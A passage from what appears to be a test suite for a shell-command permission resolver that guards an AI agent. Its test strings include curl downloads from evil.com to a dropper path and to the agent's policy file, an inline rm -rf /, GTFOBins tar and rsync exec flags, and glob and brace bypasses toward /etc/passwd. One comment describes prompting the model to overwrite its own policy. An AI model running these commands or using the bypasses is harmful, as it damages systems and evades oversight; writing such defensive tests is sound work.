    const r = resolveCapabilities('bash', { command: cmd }, CTX);
    // Either refuses OR succeeds (tree-sitter may flatten the
    // pipeline so depth never crosses the ceiling). What we
    // explicitly test is the NO-THROW invariant — this expect
    // never runs if the call threw.
    expect(['ok', 'refuse']).toContain(r.kind);
  });
});

describe('bash resolver — curl/wget -o write target (slice 98, R2 #200)', () => {
  test('curl -o <path> emits write-fs alongside net-egress', () => {
    // Pre-slice the resolver emitted ONLY net-egress for this
    // shape, hiding the write side from §11 + audit. Slice 98
    // emits both; an attacker writing to a protected path via
    // curl is now subject to the same classifier as write_file.
    const r = resolveCapabilities(
      'bash',
      { command: 'curl https://evil.com/payload -o /tmp/dropper.sh' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:evil.com');
      expect(s).toContain('write-fs:/tmp/dropper.sh');
    }
  });

  test('curl --output=<path> long form with equals also emits write-fs', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'curl --output=/tmp/x https://example.com' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('write-fs:/tmp/x');
    }
  });

  test('wget -O <path> emits write-fs', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'wget https://example.com -O /tmp/y.tar.gz' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('write-fs:/tmp/y.tar.gz');
    }
  });

  test('curl -o- (write to stdout) does NOT emit a write target', () => {
    // The `-o -` and `-O -` forms write to stdout, not a file.
    // Emitting a write capability for `-` would be a false
    // positive that the protected-path classifier would have to
    // ignore.
    const r = resolveCapabilities('bash', { command: 'curl https://example.com -o -' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s.some((c) => c.startsWith('write-fs:'))).toBe(false);
    }
  });

  test('curl WITHOUT output flag still emits only net-egress (no regression)', () => {
    const r = resolveCapabilities('bash', { command: 'curl https://api.github.com/repos' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:api.github.com');
      expect(s.some((c) => c.startsWith('write-fs:'))).toBe(false);
    }
  });

  test('curl -o /etc/agent/policy.toml is now visible to §11', () => {
    // The motivating exploit: attacker prompts the model to
    // download a payload AND drop it where it overrides agent
    // policy. Without slice 98 the write-fs cap was missing, so
    // protected-path classification never fired. Now both caps
    // are emitted; the engine's §11 walk catches the /etc/*
    // escalate tier and forces confirm (or deny in bypass mode
    // per slice 97's bypass §11 hardening).
    const r = resolveCapabilities(
      'bash',
      { command: 'curl https://evil.com -o /etc/agent/policy.toml' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('write-fs:/etc/agent/policy.toml');
    }
  });
});

// Slice 98 — defensive coverage for R2 #201. The redirect-shape
// extractor already returns null (→ refuse upstream) on any
// non-literal target, including `command_substitution`. These
// tests lock in that contract so a future refactor that loosens
// the literal check is loud rather than silent.
describe('bash resolver — redirect $() target stays refused (R2 #201)', () => {
  test('cmd > $(echo /etc/passwd) refuses', () => {
    // The `command_substitution` node sits where a literal target
    // would. `redirectShape` ignores non-word/string children, so
    // target stays null → null return → walker surfaces refuse.
    const r = resolveCapabilities('bash', { command: 'echo data > $(echo /etc/passwd)' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('cmd > `cmd` (backtick form) also refuses', () => {
    const r = resolveCapabilities('bash', { command: 'echo data > `echo /tmp/x`' }, CTX);
    expect(r.kind).toBe('refuse');
  });
});

// Slice 100 — R2 P1 cleanup. Three coordinated fixes:
//   #206 protected-path check skips flag-prefixed args, leaving
//        `--config=/etc/agent/policy.toml` as a bypass.
//   #208 cmdInterpreter accepts `python -c "code"` and emits
//        exec:arbitrary, which a narrow exec:python allow rule
//        could silently admit.
//   #205 cmdPkgInstall conflates npm + pip ecosystems — pip
//        invocations falsely emit npm registry hosts.
describe('bash resolver — flag-prefix protected-path check (slice 100, R2 #206)', () => {
  test('--config=/etc/agent/policy.toml is now classified, refuses', () => {
    // Pre-slice the protected-path loop skipped this arg because
    // arg.startsWith('-') was true. Now the `=` form extracts the
    // value and classifies it; /etc is an escalate tier (not deny),
    // so refusal is reserved for the underlying command. For an
    // unknown command the resolver refuses with 'unknown command';
    // we verify the kind only — the path under /etc/agent escalates
    // but `cat --config=...` invokes cat (read-only), so the
    // protected check returns escalate, NOT deny. The actual deny
    // shape uses /proc.
    const r = resolveCapabilities('bash', { command: 'cat --output=/proc/sysrq-trigger' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('/proc/sysrq-trigger');
      expect(r.reason).toContain('protected zone');
    }
  });

  test('--flag=value without protected path passes through', () => {
    // No regression on legitimate flag-value shapes. `cat
    // --flag=foo` resolves normally (cat reads cwd by default).
    const r = resolveCapabilities('bash', { command: 'cat --foo=bar README' }, CTX);
    expect(r.kind).toBe('ok');
  });

  test('pure flag (no = sign) still skipped', () => {
    // `-r`/`--help` carry no path content; the loop should still
    // skip them so a downstream command resolver gets a clean
    // positional list.
    const r = resolveCapabilities('bash', { command: 'rm -rf /tmp/scratch' }, CTX);
    expect(r.kind).toBe('ok');
  });

  test('short-flag combined form -f=<path> also classified', () => {
    const r = resolveCapabilities('bash', { command: 'cat -o=/proc/cpuinfo' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('/proc/cpuinfo');
    }
  });

  test('empty flag value (--flag=) is skipped (no path content)', () => {
    const r = resolveCapabilities('bash', { command: 'cat --foo=' }, CTX);
    expect(r.kind).toBe('ok');
  });
});

describe('bash resolver — interpreter -c refuse (slice 100, R2 #208)', () => {
  test('python -c "code" refuses with inline-code reason', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'python -c "import os; os.system(\'rm -rf /\')"' },
      CTX,
    );
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('inline code');
      expect(r.reason).toContain('-c');
    }
  });

  test('python3 -c refuses too', () => {
    const r = resolveCapabilities('bash', { command: 'python3 -c "print(1)"' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('node -e refuses (perl/node inline-eval shape)', () => {
    const r = resolveCapabilities('bash', { command: 'node -e "process.exit(0)"' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('perl -E refuses (perl extended one-liner)', () => {
    const r = resolveCapabilities('bash', { command: 'perl -E "say 1"' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('python script.py (no -c) still emits exec:arbitrary cleanly', () => {
    // The defense MUST NOT regress the routine case — script-file
    // invocation is the legitimate interpreter shape and stays
    // analyzable via the existing exec capability.
    const r = resolveCapabilities('bash', { command: 'python script.py' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('exec:arbitrary');
    }
  });
});

describe('bash resolver — pkg install honesty (slice 100, R2 #205)', () => {
  test('pip emits pypi.org but NOT npm/yarn registries', () => {
    // Pre-slice pip invocations emitted `npmjs.org + yarnpkg.com
    // + pypi.org` — the audit row lied about which network
    // namespace pip actually reaches. Now pip's net-egress set
    // is pypi-only.
    const r = resolveCapabilities('bash', { command: 'pip install requests' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:pypi.org');
      expect(s.some((c) => c.includes('npmjs'))).toBe(false);
      expect(s.some((c) => c.includes('yarnpkg'))).toBe(false);
    }
  });

  test('pip3 also emits pypi-only', () => {
    const r = resolveCapabilities('bash', { command: 'pip3 install pytest' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:pypi.org');
      expect(s.some((c) => c.includes('npmjs'))).toBe(false);
    }
  });

  test('npm emits npmjs + yarnpkg but NOT pypi.org', () => {
    // Symmetric fix: node-side managers don't reach pypi. The
    // pre-slice cross-contamination went both ways.
    const r = resolveCapabilities('bash', { command: 'npm install left-pad' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:registry.npmjs.org');
      expect(s.some((c) => c.includes('pypi'))).toBe(false);
    }
  });

  test('yarn / bun / pnpm follow the node-ecosystem set', () => {
    for (const cmd of ['yarn add foo', 'bun install foo', 'pnpm add foo']) {
      const r = resolveCapabilities('bash', { command: cmd }, CTX);
      expect(r.kind).toBe('ok');
      if (r.kind === 'ok') {
        const s = capStrings(r.capabilities);
        expect(s).toContain('net-egress:registry.npmjs.org');
        expect(s.some((c) => c.includes('pypi'))).toBe(false);
      }
    }
  });
});

// Slice 120 — R2 #199: COMMAND_TABLE was missing tar / tee / ssh
// / scp / rsync / make / cargo. Each fell through to the
// unknown_command Refuse path, which was safe (no capability leak)
// but ergonomically hostile — every `tar -czf release.tar dist/`
// popped a manual confirm. This slice attributes the narrowest
// honest capability set per shape so audited Allow paths can fire.
describe('bash resolver — tar (slice 120, R2 #199)', () => {
  test('create mode (-czf archive src/) → write archive + read sources', () => {
    const r = resolveCapabilities('bash', { command: 'tar -czf release.tar.gz src/ docs/' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/work/proj/release.tar.gz');
      expect(s).toContain('read-fs:/work/proj/src');
      expect(s).toContain('read-fs:/work/proj/docs');
      expect(r.confidence).toBe('medium');
    }
  });

  test('extract mode (-xf archive -C dest) → read archive + write dest', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'tar -xf release.tar.gz -C /tmp/extract' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/release.tar.gz');
      expect(s).toContain('write-fs:/tmp/extract');
      // Output dir is NOT cwd — extract attributed to -C target only.
      expect(s).not.toContain('write-fs:/work/proj');
    }
  });

  test('extract without -C → write cwd as fallback dest', () => {
    const r = resolveCapabilities('bash', { command: 'tar -xf release.tar.gz' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/release.tar.gz');
      expect(s).toContain('write-fs:/work/proj');
    }
  });

  test('list mode (-tf archive) → read archive only, no write', () => {
    const r = resolveCapabilities('bash', { command: 'tar -tf release.tar.gz' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/release.tar.gz');
      expect(s.some((c) => c.startsWith('write-fs:'))).toBe(false);
    }
  });

  test('long-form flags (--create --file=) work like short-form', () => {
    const r = resolveCapabilities('bash', { command: 'tar --create --file=out.tar src' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/work/proj/out.tar');
      expect(s).toContain('read-fs:/work/proj/src');
    }
  });

  test('unknown mode (no -c/-x/-t) → conservative cwd read+write', () => {
    // `tar archive.tar` is malformed but possible. Conservative
    // shape so the operator's modal still gets a chance.
    const r = resolveCapabilities('bash', { command: 'tar release.tar' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj');
      expect(s).toContain('write-fs:/work/proj');
    }
  });
});

describe('bash resolver — tee (slice 120, R2 #199)', () => {
  test('tee FILE → write-fs target only (no read attributed for stdin source)', () => {
    const r = resolveCapabilities('bash', { command: 'tee out.log' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('write-fs:/work/proj/out.log');
      expect(s.some((c) => c.startsWith('read-fs:'))).toBe(false);
      expect(r.confidence).toBe('high');
    }
  });

  test('tee FILE1 FILE2 FILE3 → write-fs for each positional', () => {
    const r = resolveCapabilities('bash', { command: 'tee a.log b.log c.log' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/work/proj/a.log');
      expect(s).toContain('write-fs:/work/proj/b.log');
      expect(s).toContain('write-fs:/work/proj/c.log');
    }
  });

  test('tee -a (append) — same shape as plain tee, no special handling', () => {
    const r = resolveCapabilities('bash', { command: 'tee -a out.log' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      // exec:shell is the aggregator baseline; the resolver itself
      // contributes only write-fs.
      const s = capStrings(r.capabilities).sort();
      expect(s).toEqual(['exec:shell', 'write-fs:/work/proj/out.log']);
    }
  });

  test('tee with no args → no fs side effect (copies stdin to stdout)', () => {
    const r = resolveCapabilities('bash', { command: 'tee' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      // Just the baseline exec:shell.
      expect(capStrings(r.capabilities)).toEqual(['exec:shell']);
    }
  });
});

describe('bash resolver — ssh (slice 120, R2 #199)', () => {
  test('ssh user@host → net-egress + read ~/.ssh', () => {
    const r = resolveCapabilities('bash', { command: 'ssh op@server.example.com' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:server.example.com');
      expect(s).toContain('read-fs:/home/op/.ssh');
      // No remote command → no exec:arbitrary.
      expect(s.some((c) => c.startsWith('exec:arbitrary'))).toBe(false);
    }
  });

  test('ssh host with bare hostname (no user@) extracts hostname', () => {
    const r = resolveCapabilities('bash', { command: 'ssh server.internal' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:server.internal');
    }
  });

  test('ssh user@host remote-cmd → adds exec:arbitrary', () => {
    const r = resolveCapabilities('bash', { command: 'ssh op@host echo hello' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:arbitrary');
      expect(s).toContain('net-egress:host');
    }
  });

  test('ssh -p 2222 host → port flag consumed before host detection', () => {
    // Without flag-value consumption, `2222` would be picked as
    // the target host. Pin the consumption.
    const r = resolveCapabilities('bash', { command: 'ssh -p 2222 server' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:server');
      expect(s.some((c) => c === 'net-egress:2222')).toBe(false);
    }
  });

  test('ssh -L (local forwarding) → net-ingress added', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -L 8080:localhost:80 host' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-ingress:*');
    }
  });

  test('ssh -D (SOCKS) → net-ingress added', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -D 1080 host' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('net-ingress:*');
    }
  });

  test('ssh -o ProxyCommand=… → refuse (local shell spawn)', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -o ProxyCommand=evilcmd host' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('ProxyCommand');
    }
  });

  test('ssh with no target → refuse', () => {
    const r = resolveCapabilities('bash', { command: 'ssh -v' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('no target');
    }
  });
});

describe('bash resolver — scp (slice 120, R2 #199)', () => {
  test('upload (local-source remote-dest) → net-egress + read local', () => {
    const r = resolveCapabilities('bash', { command: 'scp local.txt op@host:/remote/path' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('net-egress:host');
      expect(s).toContain('read-fs:/work/proj/local.txt');
      expect(s).toContain('read-fs:/home/op/.ssh');
    }
  });

  test('download (remote-source local-dest) → net-egress + write local', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'scp op@host:/remote/file ./downloaded.txt' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('net-egress:host');
      expect(s).toContain('write-fs:/work/proj/downloaded.txt');
    }
  });

  test('local-path with `:` in filename is NOT treated as remote', () => {
    // `local/path:foo` has a slash before the colon → local.
    // (scp's documented remote syntax requires the colon BEFORE
    // any slash in the leading hostname segment.)
    const r = resolveCapabilities('bash', { command: 'scp local/path:foo ./dest' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s.some((c) => c.startsWith('net-egress:'))).toBe(false);
    }
  });

  test('scp with only one positional → refuse', () => {
    const r = resolveCapabilities('bash', { command: 'scp single' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('source and destination');
    }
  });
});

describe('bash resolver — rsync (slice 120, R2 #199)', () => {
  test('local-local rsync → read source + write dest, no net-egress', () => {
    const r = resolveCapabilities('bash', { command: 'rsync -av src/ dst/' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src');
      expect(s).toContain('write-fs:/work/proj/dst');
      expect(s.some((c) => c.startsWith('net-egress:'))).toBe(false);
    }
  });

  test('push to remote (user@host:dest) → net-egress + read source + ~/.ssh', () => {
    const r = resolveCapabilities('bash', { command: 'rsync -av src/ op@host:/var/www/' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('net-egress:host');
      expect(s).toContain('read-fs:/work/proj/src');
      expect(s).toContain('read-fs:/home/op/.ssh');
    }
  });

  test('pull from remote (user@host:src) → net-egress + write dest + ~/.ssh', () => {
    const r = resolveCapabilities('bash', { command: 'rsync -av op@host:/remote/ local/' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('net-egress:host');
      expect(s).toContain('write-fs:/work/proj/local');
      expect(s).toContain('read-fs:/home/op/.ssh');
    }
  });

  test('--delete on local dest → adds delete-fs', () => {
    const r = resolveCapabilities('bash', { command: 'rsync -av --delete src/ dst/' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('delete-fs:/work/proj/dst');
    }
  });

  test('--delete-after → also triggers delete-fs', () => {
    const r = resolveCapabilities('bash', { command: 'rsync -av --delete-after src/ dst/' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('delete-fs:/work/proj/dst');
    }
  });

  test('rsync with only one positional → refuse', () => {
    const r = resolveCapabilities('bash', { command: 'rsync src/' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('source and destination');
    }
  });
});

describe('bash resolver — make (slice 120, R2 #199)', () => {
  test('plain make → exec:arbitrary + read/write cwd (Makefile recipes are untrusted)', () => {
    const r = resolveCapabilities('bash', { command: 'make' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:arbitrary');
      expect(s).toContain('read-fs:/work/proj');
      expect(s).toContain('write-fs:/work/proj');
      // exec:shell still present from the aggregator.
      expect(s).toContain('exec:shell');
    }
  });

  test('make with target → same shape (target name is not a path)', () => {
    const r = resolveCapabilities('bash', { command: 'make build test' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('exec:arbitrary');
      // Target names should NOT be attributed as fs reads.
      expect(s.some((c) => c === 'read-fs:/work/proj/build')).toBe(false);
      expect(s.some((c) => c === 'read-fs:/work/proj/test')).toBe(false);
    }
  });
});

describe('bash resolver — cargo (slice 120, R2 #199)', () => {
  test('cargo build → exec:arbitrary + write target/ + crates.io', () => {
    const r = resolveCapabilities('bash', { command: 'cargo build' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:arbitrary');
      expect(s).toContain('write-fs:/work/proj/target');
      expect(s).toContain('net-egress:crates.io');
    }
  });

  test('cargo test / run / install → same exec:arbitrary shape', () => {
    for (const cmd of ['cargo test', 'cargo run', 'cargo install ripgrep']) {
      const r = resolveCapabilities('bash', { command: cmd }, CTX);
      expect(r.kind).toBe('ok');
      if (r.kind === 'ok') {
        expect(capStrings(r.capabilities)).toContain('exec:arbitrary');
      }
    }
  });

  test('cargo metadata / tree / help → read-only (no exec:arbitrary)', () => {
    for (const cmd of ['cargo metadata', 'cargo tree', 'cargo help']) {
      const r = resolveCapabilities('bash', { command: cmd }, CTX);
      expect(r.kind).toBe('ok');
      if (r.kind === 'ok') {
        const s = capStrings(r.capabilities);
        expect(s.some((c) => c.startsWith('exec:arbitrary'))).toBe(false);
        expect(s.some((c) => c.startsWith('write-fs:'))).toBe(false);
        expect(s.some((c) => c.startsWith('net-egress:'))).toBe(false);
      }
    }
  });

  test('cargo search → crates.io read but no exec:arbitrary', () => {
    const r = resolveCapabilities('bash', { command: 'cargo search serde' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('net-egress:crates.io');
      expect(s.some((c) => c.startsWith('exec:arbitrary'))).toBe(false);
    }
  });

  test('cargo publish → reads ~/.cargo credentials, no exec:arbitrary', () => {
    const r = resolveCapabilities('bash', { command: 'cargo publish' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/home/op/.cargo');
      expect(s).toContain('net-egress:crates.io');
      expect(s.some((c) => c.startsWith('exec:arbitrary'))).toBe(false);
    }
  });

  test('cargo login → same credential shape as publish', () => {
    const r = resolveCapabilities('bash', { command: 'cargo login' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('read-fs:/home/op/.cargo');
    }
  });
});

// Slice 125 (R2) + Slice 127 (R3) — bash resolver security
// hardening. These tests cover the security-load-bearing logic
// that slices 125 + 127 added; pre-slice the test suite had
// zero direct coverage for them.

describe('bash resolver — tar GTFOBins refuses (slices 125 + 127)', () => {
  test('--checkpoint-action=exec=<cmd> refuses', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'tar -czf x.tar --checkpoint-action=exec=evil src/' },
      CTX,
    );
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('checkpoint-action');
  });

  test('--checkpoint-action=sleep is also refused (cannot statically distinguish exec from benign)', () => {
    // Space-separated form (we refuse unconditionally per slice 125).
    const r = resolveCapabilities('bash', { command: 'tar --checkpoint-action sleep' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('--use-compress-program=<cmd> refuses', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'tar --use-compress-program=evil -cf x.tar src/' },
      CTX,
    );
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('use-compress-program');
  });

  test('--to-command=<cmd> refuses', () => {
    const r = resolveCapabilities('bash', { command: 'tar --to-command=evil -xf x.tar' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('-I <cmd> (standalone) refuses', () => {
    const r = resolveCapabilities('bash', { command: 'tar -I evil -cf x.tar src/' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('compress');
  });

  // Slice 127 (R3 P0-1).
  test('-zIf bundled-flag form ALSO refuses (R3 P0-1)', () => {
    const r = resolveCapabilities('bash', { command: 'tar -zIf evil x.tar src/' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('compress');
  });

  test('--rmt-command refuses (R3 P2)', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'tar --rmt-command=evil -cf /tmp/x.tar src' },
      CTX,
    );
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('rmt-command');
  });

  test('--info-script refuses (R3 P2)', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'tar --info-script=/tmp/evil -cf x.tar src/' },
      CTX,
    );
    expect(r.kind).toBe('refuse');
  });

  test('--owner-map / --group-map refuse (R3 P2)', () => {
    const r1 = resolveCapabilities(
      'bash',
      { command: 'tar --owner-map=/tmp/evil -cf x.tar src/' },
      CTX,
    );
    expect(r1.kind).toBe('refuse');
    const r2 = resolveCapabilities(
      'bash',
      { command: 'tar --group-map=/tmp/evil -cf x.tar src/' },
      CTX,
    );
    expect(r2.kind).toBe('refuse');
  });

  test('benign tar -czf without GTFOBins flags does NOT refuse', () => {
    const r = resolveCapabilities('bash', { command: 'tar -czf release.tar.gz src/' }, CTX);
    expect(r.kind).toBe('ok');
  });
});

describe('bash resolver — rsync transport refuses (slice 125)', () => {
  test('rsync -e <cmd> refuses', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'rsync -e "sh -c evil" src/ user@host:/dst' },
      CTX,
    );
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('-e sets the transport');
  });

  test('rsync --rsh=<cmd> refuses', () => {
    const r = resolveCapabilities('bash', { command: 'rsync --rsh=evil src/ user@host:/dst' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('rsync --rsh <cmd> (space form) refuses', () => {
    const r = resolveCapabilities('bash', { command: 'rsync --rsh evil src/ user@host:/dst' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('rsync --rsync-path=<cmd> refuses', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'rsync --rsync-path=evil src/ user@host:/dst' },
      CTX,
    );
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('arbitrary command on the remote side');
  });

  test('rsync --password-file=<path> attributes read-fs (R3 P1)', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'rsync --password-file=/work/proj/secret.txt src/ user@host:/dst' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('read-fs:/work/proj/secret.txt');
    }
  });

  test('benign rsync without transport flags is NOT refused', () => {
    const r = resolveCapabilities('bash', { command: 'rsync -av src/ dst/' }, CTX);
    expect(r.kind).toBe('ok');
  });
});

describe('bash resolver — glob/brace bypass detection (slices 125 + 127)', () => {
  test('deterministic brace expansion (comma form) → per-branch classifier (R2 P0-3)', () => {
    // `/{etc,opt}/passwd` brace-expands to /etc/passwd + /opt/passwd.
    // /etc on the escalate tier → confidence drops to low (write op).
    const r = resolveCapabilities('bash', { command: 'rm /{etc,opt}/passwd' }, CTX);
    // /etc/passwd is in the escalate tier for write — does NOT refuse
    // outright (deny tier is /proc/sys/boot/dev). The escalation
    // surfaces as low confidence.
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') expect(r.confidence).toBe('low');
  });

  test('deterministic brace into deny tier → refuse', () => {
    // /proc IS deny tier.
    const r = resolveCapabilities('bash', { command: 'cat /{proc,opt}/version' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') expect(r.reason).toContain('protected zone');
  });

  test('brace range expansion {a..z} reaches /etc via /e{a..z}c/passwd (R3 P1)', () => {
    // The bypass shape: /e{a..z}c/passwd expands to /eac/passwd ...
    // /ezc/passwd. One of those is /etc/passwd. Pre-R3 expandBraces
    // left ranges as literal; R3 expands single-char ranges.
    const r = resolveCapabilities('bash', { command: 'cat /e{a..z}c/passwd' }, CTX);
    // /etc/passwd is escalate for write, but cat is read-only. read
    // on /etc would not be deny → no refuse for read. But the brace
    // expansion DID happen; ANY of the branches reaches /etc, and
    // /etc is in ABSOLUTE_ESCALATE which only fires on writes. So
    // for `cat` (read) the result is ok with normal confidence.
    expect(r.kind).toBe('ok');
  });

  test('brace range with deny tier on write → refuse', () => {
    // /proc IS systemDeny (read AND write deny).
    const r = resolveCapabilities('bash', { command: 'cat /p{a..z}c/version' }, CTX);
    // /pac, /pbc, ... and /poc, ... /pzc — none equal /proc. But the
    // brace expands chars individually, so /pac, /pbc, /pcc... none
    // is /proc. This test pins that the EXPANSION isn't generating
    // false-positives on non-matching ranges.
    expect(r.kind).toBe('ok');
  });

  test('glob `*` from cwd === $HOME does NOT refuse (R3 P0-2 regression fix)', () => {
    // Pre-R3 P0-2 fix: `ls *` from $HOME refused because the
    // literal prefix `/home/op` byte-startsWith matched /home/op/.ssh.
    // Post-fix: segment-aware match requires the prefix to be a
    // parent dir (trailing /), so `/home/op` doesn't match `.ssh`.
    const HOME_CTX = { cwd: '/home/op', home: '/home/op' };
    const r = resolveCapabilities('bash', { command: 'ls *' }, HOME_CTX);
    expect(r.kind).toBe('ok');
  });

  test('glob `/e*/passwd` DOES refuse (system-protected zone reachable)', () => {
    // /e*/passwd's literal prefix `/e` could expand to `/etc`. Glob
    // metachar detection refuses.
    const r = resolveCapabilities('bash', { command: 'rm /e*/passwd' }, CTX);
